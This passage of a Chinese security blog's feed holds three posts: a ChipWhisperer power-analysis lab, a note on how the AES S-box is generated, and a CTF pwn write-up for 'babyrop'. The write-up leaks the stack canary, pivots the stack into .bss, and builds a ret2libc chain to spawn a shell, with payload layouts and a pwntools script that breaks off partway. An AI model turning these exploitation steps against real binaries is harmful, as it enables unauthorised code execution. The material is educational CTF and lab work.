<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(ChipWhisperer NAEUSB WARNING|File naeusb.py:743) Your firmware (0.64) is outdated - latest is 0.65 See https://chipwhisperer.readthedocs.io/en/latest/firmware.html for more information</span><br><span class="line"></span><br><span class="line">INFO: Found ChipWhisperer😍</span><br></pre></td></tr></table></figure>



<h2 id="Uploading-Firmware"><a href="#Uploading-Firmware" class="headerlink" title="Uploading Firmware"></a>Uploading Firmware</h2><p>把lab2的固件写入到板子</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cw.program_target(scope, prog, &quot;../../../hardware/victims/firmware/simpleserial-base-lab2/simpleserial-base-&#123;&#125;.hex&quot;.format(PLATFORM))</span><br></pre></td></tr></table></figure>

<p>输出如下说明成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Detected known STMF32: STM32F302xB(C)/303xB(C)</span><br><span class="line">Extended erase (0x44), this can take ten seconds or more</span><br><span class="line">Attempting to program 4867 bytes at 0x8000000</span><br><span class="line">STM32F Programming flash...</span><br><span class="line">STM32F Reading flash...</span><br><span class="line">Verified flash OK, 4867 bytes</span><br></pre></td></tr></table></figure>

<p>此时也发现板子上的绿灯闪烁（没连上是只有一个蓝灯）</p>
<img src="https://re1own.github.io/assets/img/测信道攻击之能耗分析实验一/image-20230523033149612.png" alt="image-20230523033149612" style="zoom:33%;">

<p>以下是一个用于捕获功耗跟踪的简短函数。使用了cw.capture_trace()。可以查阅readthedocs页面以获取API文档：<a href="https://chipwhisperer.readthedocs.io/">https://chipwhisperer.readthedocs.io/</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def capture_trace(_ignored=None):</span><br><span class="line">    ktp = cw.ktp.Basic()</span><br><span class="line">    key, text = ktp.next()</span><br><span class="line">    return cw.capture_trace(scope, target, text).wave</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wave = capture_trace()</span><br><span class="line">print(&quot;✔️ OK to continue!&quot;)</span><br></pre></td></tr></table></figure>

<p>Output:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">✔️ OK to continue!</span><br></pre></td></tr></table></figure>

<h2 id="Simple-Instruction"><a href="#Simple-Instruction" class="headerlink" title="Simple Instruction"></a>Simple Instruction</h2><p>simpleserial-base固件会将我们发送给它的内容回显出来。对于本实验，对简单的指令进行实验，而不是串行通信。打开simpleserial-base-lab2文件夹中的simpleserial-base.c，在get_pt()函数中导航并删除simpleserial_put()调用。</p>
<img src="https://re1own.github.io/assets/img/测信道攻击之能耗分析实验一/image-20230523014641623.png" alt="image-20230523014641623" style="zoom:33%;">

<p>重新构建固件并将其上传到目标设备（上面有编译上传的命令，不变的，重新运行一次就行）。这里直接展示结果，捕获一个track，并可以使用以下代码绘制出来：</p>
<p><code>cw.plot(wave)</code></p>
<p><img src="https://re1own.github.io/assets/img/%E6%B5%8B%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB%E4%B9%8B%E8%83%BD%E8%80%97%E5%88%86%E6%9E%90%E5%AE%9E%E9%AA%8C%E4%B8%80/image-20230523015055403.png" alt="image-20230523015055403"></p>
<p>接下来插入一些简单的指令，以查看它们是否在功耗跟踪中可见。我们主要寻找执行在单个周期内的指令，加入20个乘法运算，此处将A标记为volatile是很重要的，以防止编译器优化掉所有这些指令。有人会纳闷为啥不用循环去做乘法，请继续往下看。</p>
<img src="https://re1own.github.io/assets/img/测信道攻击之能耗分析实验一/image-20230523021120763.png" alt="image-20230523021120763" style="zoom:33%;">

<p>能耗输出图如下：</p>
<p><img src="https://re1own.github.io/assets/img/%E6%B5%8B%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB%E4%B9%8B%E8%83%BD%E8%80%97%E5%88%86%E6%9E%90%E5%AE%9E%E9%AA%8C%E4%B8%80/image-20230523021246537.png" alt="image-20230523021246537"></p>
<h2 id="Comparing-Power-Consumption"><a href="#Comparing-Power-Consumption" class="headerlink" title="Comparing Power Consumption"></a>Comparing Power Consumption</h2><p>仔细比较上面两个图，就会发现，有变化！！！后VS前。明显乘法运算让能耗有所变化。</p>
<p><img src="https://re1own.github.io/assets/img/%E6%B5%8B%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB%E4%B9%8B%E8%83%BD%E8%80%97%E5%88%86%E6%9E%90%E5%AE%9E%E9%AA%8C%E4%B8%80/image-20230523022310827.png" alt="image-20230523022310827"></p>
<h2 id="Simple-Instruction-Loop"><a href="#Simple-Instruction-Loop" class="headerlink" title="Simple Instruction Loop"></a>Simple Instruction Loop</h2><p>接下来就是分析用for循环带来的能耗。变量依旧要用volatile，包括for里面也是，防止编译器优化。</p>
<img src="https://re1own.github.io/assets/img/测信道攻击之能耗分析实验一/image-20230523022559110.png" alt="image-20230523022559110" style="zoom: 67%;">

<p>能耗结果如下：</p>
<p><img src="https://re1own.github.io/assets/img/%E6%B5%8B%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB%E4%B9%8B%E8%83%BD%E8%80%97%E5%88%86%E6%9E%90%E5%AE%9E%E9%AA%8C%E4%B8%80/image-20230523022657197.png" alt="image-20230523022657197"></p>
<p>哈哈，能耗相比前者增加更多更多了，而且可以看到这个能量峰前面还挺均匀的。之后的实验就是来寻找指令对应的能耗具体位置。这里解释一下为啥用for循环会更耗能，在微控制器中，循环比简单的复制粘贴代码需要更多的处理步骤，例如比较大小、执行循环体以及递增循环计数器。如果不使用volatile修饰变量i，编译器通常会将循环展开，即将循环优化为重复的代码块。然而，使用volatile修饰变量i可以避免编译器进行这种优化。需要注意的是，循环展开会增加代码块的大小，因此编译器有时会避免展开循环以优化代码大小。</p>
<p><img src="https://re1own.github.io/assets/img/%E6%B5%8B%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB%E4%B9%8B%E8%83%BD%E8%80%97%E5%88%86%E6%9E%90%E5%AE%9E%E9%AA%8C%E4%B8%80/image-20230523024324766.png" alt="image-20230523024324766"></p>
<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>CPU/微控制器执行不同的指令会有不同的能量消耗和时间消耗。</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://github.com/newaetech/chipwhisperer-jupyter">Chipwhisperer-Jupyter</a></p>
]]></content>
      <tags>
        <tag>SCA</tag>
        <tag>Power Analysis Attack</tag>
      </tags>
  </entry>
  <entry>
    <title>理解AES_S-box盒生成</title>
    <url>/2023/06/18/%E7%90%86%E8%A7%A3AES-S-box%E7%9B%92%E7%94%9F%E6%88%90/</url>
    <content><![CDATA[<p>一开始，我以为S-box这玩意就是随便找的一个map去做substitution，但仔细研究发现原来这里面数学原理深奥去了。光S-box的生成就很有意思，核心就是求多项式的逆元和访射变化，之后有大量时间再做更深层次的分析，本次对AES中的S-box的生成做一个笔记，学习AES是为了了解它的数学设计思想，为之后理解<strong>Number theoretic transform</strong>热身。</p>
<h2 id="求乘法逆元"><a href="#求乘法逆元" class="headerlink" title="求乘法逆元"></a>求乘法逆元</h2><p>首先，对于S-box是行从00~ff，列也是从00～ff的一个matrix，也就是有限域GF(2^8)的所有element（0～255）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F </span><br><span class="line">10 11 12 13 14 15 16 17 18 19 1A 1B 1C 1D 1E 1F</span><br><span class="line">20 21 22 23 24 25 26 27 28 29 2A 2B 2C 2D 2E 2F </span><br><span class="line">30 31 32 33 34 35 36 37 38 39 3A 3B 3C 3D 3E 3F</span><br><span class="line">40 41 42 43 44 45 46 47 48 49 4A 4B 4C 4D 4E 4F </span><br><span class="line">50 51 52 53 54 55 56 57 58 59 5A 5B 5C 5D 5E 5F</span><br><span class="line">60 61 62 63 64 65 66 67 68 69 6A 6B 6C 6D 6E 6F </span><br><span class="line">70 71 72 73 74 75 76 77 78 79 7A 7B 7C 7D 7E 7F</span><br><span class="line">80 81 82 83 84 85 86 87 88 89 8A 8B 8C 8D 8E 8F </span><br><span class="line">90 91 92 93 94 95 96 97 98 99 9A 9B 9C 9D 9E 9F</span><br><span class="line">A0 A1 A2 A3 A4 A5 A6 A7 A8 A9 AA AB AC AD AE AF </span><br><span class="line">B0 B1 B2 B3 B4 B5 B6 B7 B8 B9 BA BB BC BD BE BF</span><br><span class="line">C0 C1 C2 C3 C4 C5 C6 C7 C8 C9 CA CB CC CD CE CF </span><br><span class="line">D0 D1 D2 D3 D4 D5 D6 D7 D8 D9 DA DB DC DD DE DF</span><br><span class="line">E0 E1 E2 E3 E4 E5 E6 E7 E8 E9 EA EB EC ED EE EF </span><br><span class="line">F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF</span><br></pre></td></tr></table></figure>

<p>把每个字节看成一个多项式用来表达它的二进制形式，ai代表第i比特位的值（0或者1）</p>
<p><img src="https://re1own.github.io/assets/img/%E7%90%86%E8%A7%A3AES-S-box%E7%9B%92%E7%94%9F%E6%88%90/image-20230618042704999.png" alt="image-20230618042704999"></p>
<p><img src="https://re1own.github.io/assets/img/%E7%90%86%E8%A7%A3AES-S-box%E7%9B%92%E7%94%9F%E6%88%90/image-20230618043439441.png" alt="image-20230618043439441"></p>
<p>将矩阵里的所有elements都求它的乘法逆元</p>
<p>00的逆元就是00本身</p>
<p><img src="https://re1own.github.io/assets/img/%E7%90%86%E8%A7%A3AES-S-box%E7%9B%92%E7%94%9F%E6%88%90/image-20230618043730475.png" alt="image-20230618043730475"></p>
<p>最重要的是如何计算多项式的乘法逆元，a(x)就是此时的字节，m(x)是一个固定的不可约多项式（因式只有1和它本身）</p>
<p><img src="https://re1own.github.io/assets/img/%E7%90%86%E8%A7%A3AES-S-box%E7%9B%92%E7%94%9F%E6%88%90/image-20230618044228637.png" alt="image-20230618044228637"></p>
<p>这里提一句，这个S-box的设计真的给AES带来了很强的扩展性，光m(x)其实就可以扩展使用其他的数来代替，比如下面这些，RJNDAEL选择了0x11b，也就是上述的m(x)多项式，关于这块想更了解的可以看这篇论文<a href="https://www.sciencedirect.com/science/article/pii/S2212017313006051">Generation of AES S-Boxes with various modulus and additive constant polynomials and testing their randomization</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">11B, 11D, 12B, 12D, 139, 13F, 14D, 15F, 163, 165, 169, 171, 177, 17B, 187, 18B, 18D, 19F, 1A3, 1A9, 1B1, 1BD, 1C3, 1CF, 1D7, 1DD, 1E7, 1F3, 1F5, 1F9.</span><br></pre></td></tr></table></figure>

<p>要求的就是b(x)</p>
<p>a(x) * b(x) = 1 mod m(x)</p>
<p>如何求多项式的乘法逆元呢？这里用到了扩展欧几里得定理</p>
<p>a(x) * b(x) + s(x) * m(x) = 1</p>
<p>这里拿02举例子，02对应的多项式为x，m(x)移到右边可以和右边的1消掉（这里的+是表示异或操作）</p>
<p><img src="https://re1own.github.io/assets/img/%E7%90%86%E8%A7%A3AES-S-box%E7%9B%92%E7%94%9F%E6%88%90/image-20230618051157794.png" alt="image-20230618051157794"></p>
<p>所以要求的b(x)就是</p>
<p><img src="https://re1own.github.io/assets/img/%E7%90%86%E8%A7%A3AES-S-box%E7%9B%92%E7%94%9F%E6%88%90/image-20230618051243218.png" alt="image-20230618051243218"></p>
<p>S-box还可以用xtime的方法更高效求逆元，具体可以参考b站这个小姐姐讲的<a href="https://www.bilibili.com/video/BV14i4y197iE/?spm_id_from=333.337.search-card.all.click">现代密码学｜AES数学基础｜GF（2^8）有限域上的运算问题</a></p>
<h2 id="仿射变化"><a href="#仿射变化" class="headerlink" title="仿射变化"></a>仿射变化</h2><p>求出了02的逆元10001101后，利用下面的矩阵运算做仿射，bi就是10001101的各个比特位的值</p>
<p><img src="https://re1own.github.io/assets/img/%E7%90%86%E8%A7%A3AES-S-box%E7%9B%92%E7%94%9F%E6%88%90/image-20230618051743126.png" alt="image-20230618051743126"></p>
<p>其实就是下面的公式（需要注意的是用到了LSB，表示低位在前，所以63的二进制是从下往上依次为01100011）</p>
<p><img src="https://re1own.github.io/assets/img/%E7%90%86%E8%A7%A3AES-S-box%E7%9B%92%E7%94%9F%E6%88%90/image-20230618051913540.png" alt="image-20230618051913540"></p>
<p>经过这轮变化后，计算出来02对应S-box中的值为7B，对照S-box表也是这个数，验证成功</p>
<p><img src="https://re1own.github.io/assets/img/%E7%90%86%E8%A7%A3AES-S-box%E7%9B%92%E7%94%9F%E6%88%90/image-20230618053334153.png" alt="image-20230618053334153"></p>
<p>关于代码实现还有仿射变化的深入理解，之后有空再总结，涉及的数学原理就太深了，光目前为止，就感受到了这些数学方法带来的扩展性和目的</p>
<p>By the way, “If you’re typing the letters A-E-S into your code, you’re doing it wrong.” - Thomas Pacek</p>
]]></content>
      <tags>
        <tag>AES</tag>
        <tag>Cryptograph</tag>
        <tag>Algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title>美团CTF_babyrop</title>
    <url>/2021/12/16/%E7%BE%8E%E5%9B%A2CTF-babyrop/</url>
    <content><![CDATA[<h1 id="Canary机制的绕过-栈迁移"><a href="#Canary机制的绕过-栈迁移" class="headerlink" title="Canary机制的绕过+栈迁移"></a>Canary机制的绕过+栈迁移</h1><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><a href="%E7%BE%8E%E5%9B%A2CTF-babyrop.zip">题目</a></p>
<p>拿到题目检查保护和链接的动态库（题目给的是libc-2.27.so，分析本地的/lib/x86_64-linux-gnu/libc.so.6就行）</p>
<p>这题的重点在于Canary保护</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">┌──(root💀e267254b2ec9)-[/home/babyrop]</span><br><span class="line">└─<span class="comment"># checksec babyrop</span></span><br><span class="line">[*] <span class="string">&#x27;/home/babyrop/babyrop&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line"> </span><br><span class="line">┌──(root💀e267254b2ec9)-[/home/babyrop]</span><br><span class="line">└─<span class="comment"># ldd babyrop</span></span><br><span class="line">        linux-vdso.so.1 (0x00007ffd2c1d3000)</span><br><span class="line">        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007ff900d17000)</span><br><span class="line">        /lib64/ld-linux-x86-64.so.2 (0x00007ff900eea000)</span><br></pre></td></tr></table></figure>

<p>逆向分析，程序流程是先输入name，然后输入password进入vuln，vuln很明显溢出了16个字节，少的可怜的溢出，并且有canary的保护</p>
<p>main</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+0h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> *v5; <span class="comment">// [rsp+8h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v6[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What your name? &quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">24</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)read(<span class="number">0</span>, &amp;v6[i], <span class="number">1uLL</span>) != <span class="number">1</span> || v6[i] == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v6[i] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s, welcome to this challenge!\n&quot;</span>, v6);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input the passwd to unlock this challenge&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%lld&quot;</span>, &amp;v5);</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="string">&quot;password&quot;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;OK!\nNow, you can input your message&quot;</span>);</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;we will reply soon&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>vuln</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">24</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>如何getshell，我的思路是分三步</p>
<ul>
<li>获取canary</li>
<li>因为溢出的字节数不够，但rbp和rsp可以覆盖，leave也比较多，因此可以考虑栈迁移的方式</li>
<li>ret2libc，因为没有system、bin_sh，需要构造两个栈，第一个栈用来泄露某个函数的实际地址，比如puts，这样就能计算出libc的基地址了，第二个栈用来getshell</li>
</ul>
<h3 id="0x1-获取canary"><a href="#0x1-获取canary" class="headerlink" title="0x1 获取canary"></a>0x1 获取canary</h3><p>canary的值每次运行都不一样，但一旦运行它就不变了，此程序canary是在fs:28h中，但我们依然可以用某种方式去获取canary，比如此程序在main函数的开头把canary的值放到了rbp+var_8中，因此接下来就是思考如何获取rbp+var_8的值了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov     rax, fs:28h</span><br><span class="line">mov     [rbp+var_8], rax</span><br></pre></td></tr></table></figure>

<p>从反汇编的C很快看出v7就是canary，并且紧接这v6字符串，这就很危险了，因为v6字符串通常是用来打印的，如果能和v7拼接上，那么就可以泄露canary</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> v6[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line"><span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br></pre></td></tr></table></figure>

<p>往下看，发现特么循环了25次！！！溢出了一个字节，因此可以和canary拼接上的！</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">24</span>; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)read(<span class="number">0</span>, &amp;v6[i], <span class="number">1uLL</span>) != <span class="number">1</span> || v6[i] == <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v6[i] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为什么要和canary拼接上？因为canary的随机值低位是00，它就是不让你去拼接的，如果循环次数是24次，永远都不可能拼上。。。</p>
<p>调试举个canary的例子，0x9ae6f96367c48800是canary的值，我输入了24个字节的A和00没拼上，这样就防止了canary的泄露</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x /40xb 0x7ffcb560da00</span><br><span class="line">0x7ffcb560da00: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41</span><br><span class="line">0x7ffcb560da08: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41</span><br><span class="line">0x7ffcb560da10: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41</span><br><span class="line">0x7ffcb560da18: 0x00    0x88    0xc4    0x67    0x63    0xf9    0xe6    0x9a</span><br><span class="line">0x7ffcb560da20: 0xb0    0x08    0x40    0x00    0x00    0x00    0x00    0x00</span><br></pre></td></tr></table></figure>

<p>但是如果输入25个A，把00低位覆盖，那么就可以泄露canary啦，像下面这样</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">┌──(root💀e267254b2ec9)-[/home/babyrop]</span><br><span class="line">└─<span class="comment"># ./babyrop</span></span><br><span class="line">What your name? </span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">Hello, AAAAAAAAAAAAAAAAAAAAAAAAA;�p��a@, welcome to this challenge!</span><br><span class="line">Please input the passwd to unlock this challenge</span><br></pre></td></tr></table></figure>

<p>在获取了canary的值后，我们就可以安心的进行栈溢出了，只需要把canary在栈上的位置覆盖成泄露的canary就能绕过保护</p>
<p>可以看下面的汇编，可知，rbp上8个字节只需要覆盖成canary即可绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov     rcx, [rbp+var_8]</span><br><span class="line">xor     rcx, fs:28h</span><br><span class="line">jz      short locret_4008A2</span><br></pre></td></tr></table></figure>



<h3 id="0x2-栈迁移"><a href="#0x2-栈迁移" class="headerlink" title="0x2 栈迁移"></a>0x2 栈迁移</h3><p>在绕过canary后却只能覆盖rbp和rsp，而rbp在程序中又没有bss地址的泄露（可能是没有用到全局变量的原因），因此我们去内存上找bss，对main断点，然后r到main，再通过gdb内的<code>vmmap</code>命令可以找到一些可读写权限的bss段，比如下面0x601000~0x602000都是可读写的</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">          0x400000           0x401000 r-xp     1000 0      /home/babyrop/babyrop</span><br><span class="line">          0x600000           0x601000 r--p     1000 0      /home/babyrop/babyrop</span><br><span class="line">          0x601000           0x602000 rw-p     1000 1000   /home/babyrop/babyrop</span><br><span class="line">    0x7f2ffd831000     0x7f2ffd833000 rw-p     2000 0      [anon_7f2ffd831]</span><br><span class="line">    0x7f2ffd833000     0x7f2ffd859000 r--p    26000 0      /usr/lib/x86_64-linux-gnu/libc-2.32.so</span><br><span class="line">    0x7f2ffd859000     0x7f2ffd9a2000 r-xp   149000 26000  /usr/lib/x86_64-linux-gnu/libc-2.32.so</span><br><span class="line">    0x7f2ffd9a2000     0x7f2ffd9ed000 r--p    4b000 16f000 /usr/lib/x86_64-linux-gnu/libc-2.32.so</span><br><span class="line">    0x7f2ffd9ed000     0x7f2ffd9ee000 ---p     1000 1ba000 /usr/lib/x86_64-linux-gnu/libc-2.32.so</span><br><span class="line">    0x7f2ffd9ee000     0x7f2ffd9f1000 r--p     3000 1ba000 /usr/lib/x86_64-linux-gnu/libc-2.32.so</span><br><span class="line">    0x7f2ffd9f1000     0x7f2ffd9f4000 rw-p     3000 1bd000 /usr/lib/x86_64-linux-gnu/libc-2.32.so</span><br><span class="line">    0x7f2ffd9f4000     0x7f2ffd9fa000 rw-p     6000 0      [anon_7f2ffd9f4]</span><br><span class="line">    0x7f2ffda06000     0x7f2ffda07000 r--p     1000 0      /usr/lib/x86_64-linux-gnu/ld-2.32.so</span><br><span class="line">    0x7f2ffda07000     0x7f2ffda27000 r-xp    20000 1000   /usr/lib/x86_64-linux-gnu/ld-2.32.so</span><br><span class="line">    0x7f2ffda27000     0x7f2ffda30000 r--p     9000 21000  /usr/lib/x86_64-linux-gnu/ld-2.32.so</span><br><span class="line">    0x7f2ffda30000     0x7f2ffda31000 r--p     1000 29000  /usr/lib/x86_64-linux-gnu/ld-2.32.so</span><br><span class="line">    0x7f2ffda31000     0x7f2ffda33000 rw-p     2000 2a000  /usr/lib/x86_64-linux-gnu/ld-2.32.so</span><br><span class="line">    0x7ffcdec85000     0x7ffcdeca6000 rw-p    21000 0      [stack]   </span><br><span class="line">    0x7ffcded0f000     0x7ffcded13000 r--p     4000 0      [vvar]    </span><br><span class="line">    0x7ffcded13000     0x7ffcded14000 r-xp     1000 0      [vdso] </span><br></pre></td></tr></table></figure>

<p>特别注意！bss不能两次重复写，这是我两次重复写在exp中调试的结果报错，因此我们需要拿出两段bss1（0x601a00）和bss2（0x601b00）</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">[Attaching after process 2902 vfork to child process 2936]</span><br><span class="line">[New inferior 2 (process 2936)]</span><br><span class="line">[Detaching vfork parent process 2902 after child <span class="built_in">exec</span>]</span><br><span class="line">[Inferior 1 (process 2902) detached]</span><br><span class="line">process 2936 is executing new program: /usr/bin/dash</span><br><span class="line">Warning:</span><br><span class="line">Cannot insert breakpoint 1.</span><br><span class="line">Cannot access memory at address 0x400717</span><br><span class="line">Cannot insert breakpoint 2.</span><br><span class="line">Cannot access memory at address 0x40072e</span><br><span class="line">Cannot insert breakpoint 5.</span><br><span class="line">Cannot access memory at address 0x40073f</span><br><span class="line">Cannot insert breakpoint 3.</span><br><span class="line">Cannot access memory at address 0x400744</span><br><span class="line">Cannot insert breakpoint 4.</span><br><span class="line">Cannot access memory at address 0x40086e</span><br></pre></td></tr></table></figure>



<h3 id="0x3-ret2libc"><a href="#0x3-ret2libc" class="headerlink" title="0x3 ret2libc"></a>0x3 ret2libc</h3><p>在vuln中，我们直接取这一段0x40072E作为每次溢出的attack function，它会把当前rbp往前0x20个字节（递减）从低地址往高地址进行读入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:000000000040072E                 lea     rax, [rbp+buf]</span><br><span class="line">.text:0000000000400732                 mov     edx, 30h ; &#x27;0&#x27;  ; nbytes</span><br><span class="line">.text:0000000000400737                 mov     rsi, rax        ; buf</span><br><span class="line">.text:000000000040073A                 mov     edi, 0          ; fd</span><br><span class="line">.text:000000000040073F                 call    _read</span><br></pre></td></tr></table></figure>

<p>所以我们第一次输入先改变rbp和rsp就行，输入’A’*24 + p64(canary) +p64(bss1+0x20) + p64(0x40072E)，这样read后，vuln快结束时执行leave和ret，rbp就指向了一段bss（让第二次输入从bss地址开始往下），sp指向0x40072E再次进行一次溢出输入，此时第二次输入就构造出一个可用于泄露函数实际地址的栈空间payload = p64(pop_rdi_ret) + p64(puts_got) + p64(0x40086E) + p64(canary) + p64(bss1-0x8) + p64(leave_ret)，这里最关键的一点是0x40086E而不是puts的plt地址，因为sp为这段地址后会执行vuln，这样我就省了一次在bss上布置执行vuln的栈空间了。这里参数通过pop rdi，让下面的call puts去打印puts的实际地址，然后也不需要管sp了，自觉再来一次vuln</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000400867                 lea     rdi, aOkNowYouCanInp ; &quot;OK!\nNow, you can input your message&quot;</span><br><span class="line">.text:000000000040086E                 call    _puts</span><br><span class="line">.text:0000000000400873                 mov     eax, 0</span><br><span class="line">.text:0000000000400878                 call    vuln</span><br></pre></td></tr></table></figure>

<p>按照前面的思路，后面的ret2libc就很简单了，只需要再来一次栈溢出，在bss2上构造一段可以ret2libc的数据就可以getshell了，结构和前面一样，具体可参考EXP</p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    p = process(<span class="string">&quot;./babyrop&quot;</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    payload1 = <span class="string">&#x27;A&#x27;</span>*<span class="number">25</span></span><br><span class="line">    p.send(payload1)</span><br><span class="line">    canary = p.recv()</span><br><span class="line">    canary = canary[<span class="number">32</span>:<span class="number">39</span>]</span><br><span class="line">    canary = canary.rjust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    canary = u64(canary)</span><br><span class="line">    libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">    elf = ELF(<span class="string">&quot;./babyrop&quot;</span>)</span><br><span class="line"></span><br><span 